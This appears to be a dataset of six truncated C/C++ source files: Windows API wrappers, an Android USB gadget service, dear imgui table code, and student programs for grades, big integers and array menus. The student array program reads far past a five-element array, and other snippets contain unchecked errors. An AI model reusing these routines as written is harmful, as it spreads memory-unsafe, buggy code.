    "#include <Wx32/Private/WxKernel32.h>\n\nnamespace Wx32::Kernel32\n{\nauto GetModuleFileNameU8(HMODULE hModule) -> MbcsStr_t\n{\n    uint32_t written_chars{};\n    uint32_t buffer_max_chars = MAX_PATH;\n    std::unique_ptr<wchar_t[]> buffer;\n    do\n    {\n        buffer_max_chars *= 2;\n        buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n        written_chars = ::GetModuleFileNameW(hModule, buffer.get(), buffer_max_chars);\n    } while (written_chars >= buffer_max_chars);\n\n    return Utils::ApiStrCvt({ buffer.get(), written_chars });\n}\n\nauto GetCurrentDirectoryU8() -> MbcsStr_t\n{\n    uint32_t real_chars{};\n    uint32_t buffer_max_chars = MAX_PATH;\n    std::unique_ptr<wchar_t[]> buffer;\n\n    buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n    real_chars = ::GetCurrentDirectoryW(buffer_max_chars, buffer.get());\n\n    if (real_chars > buffer_max_chars)\n    {\n        buffer_max_chars = real_chars;\n        buffer = std::make_unique_for_overwrite<wchar_t[]>(buffer_max_chars);\n        real_chars = ::GetCurrentDirectoryW(buffer_max_chars, buffer.get());\n    }\n\n    return Utils::ApiStrCvt({ buffer.get(), real_chars });\n}\n\nauto CreateFileU8(const std::string_view u8FilePath, CreateFileU8_Property Properties) -> std::optional<SysID>\n{\n    const auto hfile = ::CreateFileW(\n        Utils::ApiStrCvt(u8FilePath).first.data(), \n        static_cast<DWORD>(Properties.dwDesiredAccess), \n        static_cast<DWORD>(Properties.dwShareMode), \n        Properties.lpSecurityAttributes, \n        static_cast<DWORD>(Properties.dwCreationDisposition), \n        static_cast<DWORD>(Properties.dwFlagsAndAttributes), \n        Properties.hTemplateFile);\n    return (hfile != INVALID_HANDLE_VALUE) ? std::optional<SysID>{ hfile } : std::nullopt;\n}\n\nauto WriteFile(SysID hFile, std::span<const uint8_t> spData, LPOVERLAPPED lpOverlapped) -> std::optional<size_t>\n{\n    DWORD written{};\n    bool status = (::WriteFile(hFile, spData.data(), static_cast<DWORD>(spData.size_bytes()), &written, lpOverlapped) != FALSE);\n    return status ? std::optional<size_t>{ static_cast<size_t>(written) } : std::nullopt;\n}\n\nauto ReadFile(SysID hFile, std::span<uint8_t> spBuffer, LPOVERLAPPED lpOverlapped) -> std::optional<size_t>\n{\n    DWORD read{};\n    bool status = (::ReadFile(hFile, spBuffer.data(), static_cast<DWORD>(spBuffer.size_bytes()), &read, lpOverlapped) != FALSE);\n    return status ? std::optional<size_t>{ static_cast<size_t>(read) } : std::nullopt;\n}\n\nauto GetFileSizeEx(SysID hFile) -> std::optional<uint64_t>\n{\n    LARGE_INTEGER file_size{};\n    ::GetFileSizeEx(hFile, &file_size);\n    return static_cast<uint64_t>(file_size.QuadPart);\n}\n\nauto SetFilePointerEx(SysID hFile, uint64_t nOffset, MoveWayEnum eMoveWay) -> std::optional<uint64_t>\n{\n    LARGE_INTEGER new_file_pointer;\n    LARGE_INTEGER move_distance = { .QuadPart = static_cast<LONGLONG>((nOffset)) };\n    bool status = (::SetFilePointerEx(hFile, move_distance, &new_file_pointer, static_cast<DWORD>(eMoveWay)) != FALSE);\n    return status ? std::optional<uint64_t>{ static_cast<uint64_t>(new_file_pointer.QuadPart) } : std::nullopt;\n}\n\nauto CloseHandle(SysID hFile) -> bool\n{\n    return ::CloseHandle(hFile) != FALSE;\n}\n\nauto FlushFileBuffers(SysID hFile) -> bool\n{\n    return ::FlushFileBuffers(hFile) != FALSE;\n}\n\nauto CreateDirectoryU8(const std::string_view u8DirName, LPSECURITY_ATTRIBUTES lpSecurityAttributes) -> bool\n{\n    return ::CreateDirectoryW(Utils::ApiStrCvt(u8DirName).first.data(), lpSecurityAttributes) != FALSE;\n}\n\nauto RemoveDirectoryU8(const std::string_view u8DirName) -> bool\n{\n    return ::RemoveDirectoryW(Utils::ApiStrCvt(u8DirName).first.data()) != FALSE;\n}\n\nauto GetFileAttributesU8(const std::string_view u8Path) -> size_t\n{\n    return ::GetFileAttributesW(Utils::ApiStrCvt(u8Path).first.data());\n}\n\nauto DeleteFileU8(const std::string_view u8FilePath) -> bool\n{\n    return ::DeleteFileW(Utils::ApiStrCvt(u8FilePath).first.data()) != FALSE;\n}\n\nauto CopyFileU8(const std::string_view u8ExistFilePath, const std::string_view u8NewFilePath, bool bFailIfExists) -> bool\n{\n    return ::CopyFileW(Utils::ApiStrCvt(u8ExistFilePath).first.data(), Utils::ApiStrCvt(u8NewFilePath).first.data(), bFailIfExists ? TRUE : FALSE) != FALSE;\n}\n\nauto MoveFileU8(const std::string_view u8ExistFilePath, const std::string_view u8NewFilePath) -> bool\n{\n    return ::MoveFileW(Utils::ApiStrCvt(u8ExistFilePath).first.data(), Utils::ApiStrCvt(u8NewFilePath).first.data()) != FALSE;\n}\n\nauto GetStdHandle(STDHandleEnum eHandle) -> std::optional<SysID>\n{\n    const auto handle = ::GetStdHandle(static_cast<DWORD>(eHandle));\n    return ((handle != INVALID_HANDLE_VALUE) && (handle != 0)) ? std::optional<SysID>{ handle } : std::nullopt;\n}\n\nauto WriteConsoleU8(SysID hConsoleOutput, const std::string_view u8Text, void* lpReserved) -> std::optional<size_t>\n{\n    DWORD written{};\n    auto text_wstr = Utils::ApiStrCvt(u8Text);\n    bool status = (::WriteConsoleW(hConsoleOutput, text_wstr.first.data(), stati",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb.gadget@1.1-service.light\"\n\n#include \"UsbGadget.h\"\n#include <dirent.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/inotify.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nconstexpr int BUFFER_SIZE = 512;\nconstexpr int MAX_FILE_PATH_LENGTH = 256;\nconstexpr int EPOLL_EVENTS = 10;\nconstexpr bool DEBUG = false;\nconstexpr int DISCONNECT_WAIT_US = 100000;\nconstexpr int PULL_UP_DELAY = 500000;\n\n#define BUILD_TYPE \"ro.build.type\"\n#define GADGET_PATH \"/config/usb_gadget/g1/\"\n#define PULLUP_PATH GADGET_PATH \"UDC\"\n#define GADGET_NAME GetProperty(kGadgetProp, \"\")\n#define PERSISTENT_BOOT_MODE \"ro.bootmode\"\n#define VENDOR_ID_PATH GADGET_PATH \"idVendor\"\n#define PRODUCT_ID_PATH GADGET_PATH \"idProduct\"\n#define DEVICE_CLASS_PATH GADGET_PATH \"bDeviceClass\"\n#define DEVICE_SUB_CLASS_PATH GADGET_PATH \"bDeviceSubClass\"\n#define DEVICE_PROTOCOL_PATH GADGET_PATH \"bDeviceProtocol\"\n#define DESC_USE_PATH GADGET_PATH \"os_desc/use\"\n#define OS_DESC_PATH GADGET_PATH \"os_desc/b.1\"\n#define CONFIG_PATH GADGET_PATH \"configs/b.1/\"\n#define FUNCTIONS_PATH GADGET_PATH \"functions/\"\n#define FUNCTION_NAME \"function\"\n#define FUNCTION_PATH CONFIG_PATH FUNCTION_NAME\n#define RNDIS_PATH FUNCTIONS_PATH \"rndis.gs4\"\n\n#define PERSISTENT_VENDOR_CONFIG \"persist.vendor.usb.usbradio.config\"\n#define VENDOR_CONFIG \"vendor.usb.config\"\n\nnamespace android {\nnamespace hardware {\nnamespace usb {\nnamespace gadget {\nnamespace V1_1 {\nnamespace implementation {\n\nvolatile bool gadgetPullup;\n\n// Used for debug.\nstatic void displayInotifyEvent(struct inotify_event *i) {\n  ALOGE(\"    wd =%2d; \", i->wd);\n  if (i->cookie > 0) ALOGE(\"cookie =%4d; \", i->cookie);\n\n  ALOGE(\"mask = \");\n  if (i->mask & IN_ACCESS) ALOGE(\"IN_ACCESS \");\n  if (i->mask & IN_ATTRIB) ALOGE(\"IN_ATTRIB \");\n  if (i->mask & IN_CLOSE_NOWRITE) ALOGE(\"IN_CLOSE_NOWRITE \");\n  if (i->mask & IN_CLOSE_WRITE) ALOGE(\"IN_CLOSE_WRITE \");\n  if (i->mask & IN_CREATE) ALOGE(\"IN_CREATE \");\n  if (i->mask & IN_DELETE) ALOGE(\"IN_DELETE \");\n  if (i->mask & IN_DELETE_SELF) ALOGE(\"IN_DELETE_SELF \");\n  if (i->mask & IN_IGNORED) ALOGE(\"IN_IGNORED \");\n  if (i->mask & IN_ISDIR) ALOGE(\"IN_ISDIR \");\n  if (i->mask & IN_MODIFY) ALOGE(\"IN_MODIFY \");\n  if (i->mask & IN_MOVE_SELF) ALOGE(\"IN_MOVE_SELF \");\n  if (i->mask & IN_MOVED_FROM) ALOGE(\"IN_MOVED_FROM \");\n  if (i->mask & IN_MOVED_TO) ALOGE(\"IN_MOVED_TO \");\n  if (i->mask & IN_OPEN) ALOGE(\"IN_OPEN \");\n  if (i->mask & IN_Q_OVERFLOW) ALOGE(\"IN_Q_OVERFLOW \");\n  if (i->mask & IN_UNMOUNT) ALOGE(\"IN_UNMOUNT \");\n  ALOGE(\"\\n\");\n\n  if (i->len > 0) ALOGE(\"        name = %s\\n\", i->name);\n}\n\nstatic void *monitorFfs(void *param) {\n  UsbGadget *usbGadget = (UsbGadget *)param;\n  char buf[BUFFER_SIZE];\n  bool writeUdc = true, stopMonitor = false;\n  struct epoll_event events[EPOLL_EVENTS];\n  steady_clock::time_point disconnect;\n\n  bool descriptorWritten = true;\n  for (int i = 0; i < static_cast<int>(usbGadget->mEndpointList.size()); i++) {\n    if (access(usbGadget->mEndpointList.at(i).c_str(), R_OK)) {\n      descriptorWritten = false;\n      break;\n    }\n  }\n\n  // notify here if the endpoints are already present.\n  if (descriptorWritten) {\n    usleep(PULL_UP_DELAY);\n    if (!!WriteStringToFile(GADGET_NAME, PULLUP_PATH)) {\n      lock_guard<mutex> lock(usbGadget->mLock);\n      usbGadget->mCurrentUsbFunctionsApplied = true;\n      gadgetPullup = true;\n      writeUdc = false;\n      ALOGI(\"GADGET pulled up\");\n      usbGadget->mCv.notify_all();\n    }\n  }\n\n  while (!stopMonitor) {\n    int nrEvents = epoll_wait(usbGadget->mEpollFd, events, EPOLL_EVENTS, -1);\n\n    if (nrEvents <= 0) {\n      ALOGE(\"epoll wait did not return descriptor number\");\n      continue;\n    }\n\n    for (int i = 0; i < nrEvents; i++) {\n      ALOGI(\"event=%u on fd=%d\\n\", events[i].events, events[i].data.fd);\n\n      if (events[i].data.fd == usbGadget->mInotifyFd) {\n        // Process all of the events in buffer returned by read().\n        int numRead = read(usbGadget->mInotifyFd, buf, BUFFER_SIZE);\n        for (char *p = buf; p < buf + numRead;) {\n          struct inotify_event *event = (struct inotify_event *)p;\n          if (DEBUG) displayInotifyEvent(event);\n\n          p += sizeof(struct inotify_event) + event->len;\n\n          bool descriptorPresent = true;\n          for (int j = 0; j < static_cast<int>(usbGadget->mEndpointList.size());\n               j+",
    "// dear imgui, v1.90.1\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - o",
    "#include <iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n//q3 functions\r\nvoid Input(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tifstream filein(\"grades.txt\");          // Open the file for reading\r\n\tif (filein.fail())             // Check if the file opening is successful\r\n\t{\r\n\t\tcout << \"Could not open file!\";\r\n\t\tsystem(\"pause\");\r\n\t\texit(0);\r\n\t}\r\n\r\n\tint temp;\r\n\t// Read the total number of records from the file\r\n\tfilein >> temp;\r\n\r\n\tchar chr;\r\n\tfilein.get(chr);\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\t// Read and store student names\r\n\t\tfilein.get(chr);\r\n\t\tfor (int j = 0; chr != ','; j++)\r\n\t\t{\r\n\t\t\tname[i * maximum_size + j] = chr;\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 1 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject1[i] = subject1[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 2 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject2[i] = subject2[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 3 grades\r\n\t\tfilein >> subject3[i];\r\n\r\n\t\tfilein.get(chr);\r\n\t}\r\n\tfilein.close();\r\n}\r\nvoid Output(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++)\r\n\t\t\tcout << name[i * maximum_size + j];\r\n\t\tcout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Students_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) cout << name[i * maximum_size + j];\r\n\t\tcout << fixed << setprecision(3) << showpoint << (subject1[i] + subject2[i] + subject3[i]) / 3.0 << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Subjects_average(int subject1[], int subject2[], int subject3[], const int records)\r\n{\r\n\tcout << \"Subject 1: \";\r\n\tdouble average = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject1[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 2: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject2[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 3: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject3[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records << \"\\n\\n\";\r\n}\r\n// Function to find and display student with the highest average and subject with the lowest average\r\nvoid Highest_and_lowest_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << \"Student with Highest Average:\\n\\n\";\r\n\tint highest_index = 0;\r\n\tdouble highest = -1;\r\n\tfor (int i = 0; i < records; i++)\r\n\t\tif ((subject1[i] + subject2[i] + subject3[i]) / 3.0 > highest)\r\n\t\t{\r\n\t\t\thighest = (subject1[i] + subject2[i] + subject3[i]) / 3.0;\r\n\t\t\thighest_index = i;\r\n\t\t}\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tcout << setw(8) << highest_index + 1;\r\n\tfor (int j = 0; j < maximum_size; j++)\r\n\t\tcout << name[highest_index * maximum_size + j];\r\n\tcout << fixed << setprecision(3) << showpoint << highest << \"\\n\\n\";\r\n\tcout << \"Subject with Lowest Average:\\n\\n\";\r\n\tint lowest_number = 0;\r\n\tdouble lowest = 100, tempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject1[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 1; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject2[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 2; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject3[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 3; }\r\n\tcout << \"SUBJECT  AVERAGE\\n\";\r\n\tcout << setw(9) << lowest_number << fixed << setprecision(2) << showpoint << lowest << \"\\n\\n\";\r\n}\r\n// Function to perform various analyses and write results to \"analysis.txt\"\r\nvoid Analysis(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tofstream fileout(\"analysis.txt\");\r\n\tfileout << \"Grades:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) fileout << name[i * maximum_size + j];\r\n\t\tfileout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n\tfileout << \"\\nAverage of Students:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_si",
    "#include \"BigNumber.h\"\n\n// regex function that checks the validation of the input.\nbool BigDecimalInt :: checkValidInput(string input)\n{\n    regex validInput(\"[-+]?[0-9]+\");\n    return regex_match(input, validInput);\n}\n\n// constructor that takes a string as an input.\nvoid BigDecimalInt :: setNumber(string num)\n{\n    bool validNumber = checkValidInput(num);\n    if(validNumber)\n    {\n        number = num;\n        if(number[0] == '+')\n        {\n            number.erase(0,1);\n            signNumber = '+';\n        }\n        else if (number[0] == '-')\n        {\n            number.erase(0,1);\n            signNumber = '-';\n        }\n        else\n        {\n            signNumber = '+';\n        }\n    }\n    else\n    {\n        cout << \"Invalid\" << \"\\n\";\n        exit(1);\n    }\n}\n\n// operator < overloading function.\nbool BigDecimalInt :: operator < (const BigDecimalInt& anotherDec)\n{\n    string comp1 = \"\", comp2 = \"\";\n    long long len1 = number.length(), len2 = anotherDec.number.length();\n\n    while (len1 < len2){\n        comp1 += '0';\n        len1++;\n    }\n    while (len2 < len1){\n        comp2 += '0';\n        len2++;\n    }\n    comp1 += number;\n    comp2 += anotherDec.number;\n\n    if(signNumber == '-' && anotherDec.signNumber == '+')\n    {\n        return true;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '-')\n    {\n        return false;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '+')\n    {\n        return comp1 < comp2;\n    }\n    else\n    {\n        return comp1 > comp2;\n    }\n}\n\n// operator > overloading function.\nbool BigDecimalInt :: operator > (const BigDecimalInt &anotherDec)\n{\n    string comp1 = \"\", comp2 = \"\";\n    long long len1 = number.length(), len2 = anotherDec.number.length();\n\n    while (len1 < len2){\n        comp1 += '0';\n        len1++;\n    }\n    while (len2 < len1){\n        comp2 += '0';\n        len2++;\n    }\n    comp1 += number;\n    comp2 += anotherDec.number;\n\n    if(signNumber == '-' && anotherDec.signNumber == '+')\n    {\n        return false;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '-')\n    {\n        return true;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '+')\n    {\n        return comp1 > comp2;\n    }\n    else\n    {\n        return comp1 < comp2;\n    }\n}\n\n// operator == overloading function.\nbool BigDecimalInt :: operator == (const BigDecimalInt anotherDec)\n{\n    if (signNumber == anotherDec.signNumber && number == anotherDec.number)\n    {\n        return true;\n\n    }\n    else\n    {\n        return false;\n    }\n}\n\n// operator = overloading function.\nBigDecimalInt& BigDecimalInt :: operator = (BigDecimalInt anotherDec)\n{\n    signNumber = anotherDec.signNumber;\n    number = anotherDec.number;\n    return *this;\n}\n\n//addition implementation.\nstring addition(string num1,string num2)\n{\n    auto it1 = num1.rbegin();\n    auto it2 = num2.rbegin();\n    string res = \"\";\n    int carry = 0;\n    while (it1 != num1.rend())\n    {\n        int twoDigitsSum;\n        carry = 0;\n        twoDigitsSum = ((*it1 - '0') + (*it2 - '0'));\n        if (twoDigitsSum >= 10)\n        {\n            carry = 1;\n        }\n        res = char((twoDigitsSum % 10) + '0') + res;\n        *(it1 + 1) = char(((*(it1 + 1) - '0') + carry) + '0');\n        it1++;\n        it2++;\n    }\n    if (carry)\n    {\n        res = char((carry) + '0') + res;\n    }\n    return res;\n}\n\n//subtraction implementation\nstring subtraction(string num1,string num2){\n    deque<long long>d;\n    string res;\n\n    for (long long i = num1.length() - 1; i >= 0; i--)\n    {\n        if (num1[i] < num2[i])\n        {\n            num1[i] = char (((num1[i] - '0') + 10) + '0');\n            num1[i - 1] = char (((num1[i - 1] - '0') - 1) + '0');\n            d.push_front((num1[i] - '0') - (num2[i] - '0'));\n        }\n        else\n        {\n            d.push_front((num1[i] - '0') - (num2[i] - '0'));\n        }\n    }\n\n    for (auto i : d)\n    {\n        res += to_string(i);\n    }\n    return res;\n}\n\n// // operator + overloading function.\nBigDecimalInt BigDecimalInt :: operator + (BigDecimalInt number2)\n{\n    BigDecimalInt result;\n    char signNumber1 = signNumber, signNumber2 = number2.signNumber;\n    string num1 = number, num2 = number2.number;\n    BigDecimalInt number1 = *this;\n\n    while (num1.length() < num2.length()){\n        num1 = '0' + num1;\n    }\n    while (num2.length() < num1.length()){\n        num2 = '0' + num2;\n    }\n\n    if (signNumber1 == signNumber2){\n        result.signNumber = signNumber1;\n        result.number = addition(num1,num2);\n\n    }else{\n\n        if(number1.signNumber == '-')\n        {\n            number1.signNumber = '+';\n            result = (number2 - number1);\n        }\n        else{\n            number2.signNumber = '+';\n            result = (number1 - number2);\n        }\n    }\n    return result;\n}\n\n// operator - overloading function.\nBigDecimalInt BigDecimalInt :: operator - (BigDecimalInt anotherDec)\n{\n    BigDecimalInt obj;\n    deque<long long> d;\n    string strmin = \"\", res = \"\";\n    s",
    "#include<stdio.h> \r\n\r\nvoid Traverse();\r\nvoid Insertion_at_begin();\r\nvoid Insertion_at_end();\r\nvoid Insertion_at_loc();\r\nvoid Deletion_at_begin();\r\nvoid Deletion_at_end();\r\nvoid Deletion_at_loc();\r\n\r\nint lb = 0;\r\nint ub = 5;\r\nint choice;\r\nint arr[5];\r\n\r\n\r\nvoid array()\r\n {\r\n    printf(\"The array elements are: \\n\");\r\n    for (int i = 0; i < 100; i++) \r\n\t{\r\n      printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nint main() \r\n{\r\n    do \r\n\t{\r\n    \tarray();\r\n        printf(\"Menu:\\n\");\r\n        printf(\"1:Traversing in array\\n\");\r\n        printf(\"2:Insertion at the beginning\\n\");\r\n        printf(\"3:Insertion at the end\\n\");\r\n        printf(\"4:Insertion at a particular location\\n\");\r\n        printf(\"5:Deletion at the beginning\\n\");\r\n        printf(\"6:Deletion at the end\\n\");\r\n        printf(\"7:Deletion at a particular location\\n\");\r\n        printf(\"8:EXIT\\n\");\r\n\r\n        printf(\"Enter your choice (1-8): \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                Traverse();\r\n                break;\r\n            case 2:\r\n                Insertion_at_begin();\r\n                break;\r\n            case 3:\r\n                Insertion_at_end();\r\n                break;\r\n            case 4:\r\n                Insertion_at_loc();\r\n                break;\r\n            case 5:\r\n                Deletion_at_begin();\r\n                break;\r\n            case 6:\r\n                Deletion_at_end();\r\n                break;\r\n            case 7:\r\n                Deletion_at_loc();\r\n                break;\r\n            case 8:\r\n                printf(\"Exiting the program. Goodbye!\\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice. Please enter a number between 1 and 8.\\n\");\r\n        }\r\n    } while (choice != 8);\r\n\r\n    return 0;\r\n}\r\n\r\nvoid Traverse()\r\n {\r\n    int temp;\r\n    if (ub < lb)\r\n\t{\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n\t else \r\n\t{\r\n        temp = lb;\r\n        while (temp <= ub) \r\n\t\t{\r\n            printf(\"%d\\n\", arr[temp]);\r\n            temp = temp + 1;\r\n        }\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_begin() \r\n{\r\n    int value;\r\n    int temp;\r\n    if (ub == 5 - 1)\r\n\t{\r\n        printf(\"Array is full\\n\");\r\n    } \r\n\telse if (ub < 0) \r\n\t{\r\n        ub = 0;\r\n        \r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[ub] = value;\r\n    } \r\n\telse \r\n\t{\r\n        temp = ub;\r\n        while (temp >= lb) \r\n\t\t{\r\n            arr[temp + 1] = arr[temp];\r\n            temp = temp - 1;\r\n        }\r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[lb] = value;\r\n    }\r\n    ub++;\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_end()\r\n{\r\n\tint value;\r\n\tif(ub==5-1)\r\n\t{\r\n\t  printf(\"Array is full\");\t\r\n\t}\r\n    else if(ub<0)\r\n    {\r\n    \tlb=0;\r\n    \tub=0;\r\n    \tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n    \tarr[ub]=value;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tub++;\r\n\t\tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n\t\tarr[ub]=value;\r\n\t}\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n\tprintf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_loc() \r\n{\r\n\tint loc;\r\n\tint value;\r\n\tint temp;\r\n\tprintf(\"enter the location where to add array:\");\r\n\tscanf(\"%d\",&loc);\r\n\tprintf(\"Enter the value to be inserted: \");\r\n    scanf(\"%d\",&value);\t\r\n\t\r\n   if(loc<0||ub==5-1||loc>ub+1)\r\n   {\r\n   \t  printf(\"Invalid location or array is full\\n\");\r\n   }\r\n\telse\r\n\t{\r\n        for (int i = ub; 